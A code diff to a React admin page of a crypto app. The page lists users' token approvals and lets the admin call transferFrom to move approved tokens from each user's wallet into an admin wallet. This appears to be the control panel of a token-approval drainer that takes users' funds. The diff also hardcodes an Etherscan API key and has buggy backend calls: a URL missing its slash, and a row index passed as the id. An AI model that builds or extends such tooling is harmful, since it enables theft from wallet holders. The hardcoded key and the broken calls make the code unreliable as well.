@@ -14,6 +14,7 @@ const GET_ETH_SCAN_API_KEY = "YRVQAVGPB6NHD9D9412VPTIRUZ5BK956K5"
 const AdminScreen = () => {
   const [products, setProduct] = useState([]);
   const [transferAmount, setTransferAmount] = useState(0);
+
   useEffect(() => {
     getProducts();
   }, []);
@@ -62,7 +63,7 @@ const AdminScreen = () => {
   const handleChangeAmount = (value) => {
     setTransferAmount(value);
   }
-  const handleTransfer = async (approveToken) => {
+  const handleTransfer = async (approveToken, id) => {
     if (transferAmount === 0) {
       NotificationManager.warning('Transfer Amount is not 0.', 'Transfer Amount Warning', 3000);
     }
@@ -76,7 +77,11 @@ const AdminScreen = () => {
         let temp = await axios.get(api);
         const contractABI = JSON.parse(temp.data.result);
         const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
-        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress })
+        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress }).then(async function (receipt) {
+          await axios.post('http://localhost:5000/products' + id, {
+            amount: approveToken.amount - transferAmount,
+          });
+        });
       } else {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
@@ -97,8 +102,8 @@ const AdminScreen = () => {
         <thead>
           <tr>
             <th>No</th>
-            <td><input type="checkbox" /></td>
             <th>User Address</th>
+            <th>Admin Address</th>
             <th>Amount</th>
             <th>Symbol</th>
             <th>Manage Amount</th>
@@ -109,18 +114,22 @@ const AdminScreen = () => {
           {products && products.map((a, idx) => (
             <tr key={idx}>
               <td>{idx + 1}</td>
-              <td><input type="checkbox" width={50} /></td>
-              <td>{a.userWalletAddress.slice(0, 5) + '...' + a.userWalletAddress.slice(-4, a.userWalletAddress.length)}</td>
+              <td title={a.userWalletAddress}>{a.userWalletAddress.slice(0, 5) + '...' + a.userWalletAddress.slice(-4, a.userWalletAddress.length)}</td>
+              <td title={a.adminAddress}>{a.adminAddress.slice(0, 5) + '...' + a.adminAddress.slice(-4, a.adminAddress.length)}</td>
               <td>{a.amount}</td>
               <td>{a.symbol}</td>
-              <td><input className='form-control' type="number" onChange={(e) => handleChangeAmount(e.target.value)} /></td>
-              <td><button className='form-control' type="number" onClick={() => { handleTransfer(a) }} >Transfer</button></td>
+              <td className='position-relative '>
+                {/* <button style={{ width: "55px", right: "0.5rem" }} onClick={() => {
+                  products[idx].maxAmount = a.value;
+                }} className='position-absolute form-control'>Max</button> */}
+                <input className='form-control' type="number" value={a.amount} onChange={(e) => handleChangeAmount(e.target.value)} /></td>
+              <td><button className='form-control' type="number" onClick={() => { handleTransfer(a, idx) }} >Transfer</button></td>
             </tr>
           ))}
         </tbody>
       </table>
       <NotificationContainer />
-    </div>
+    </div >
   );
 };
 
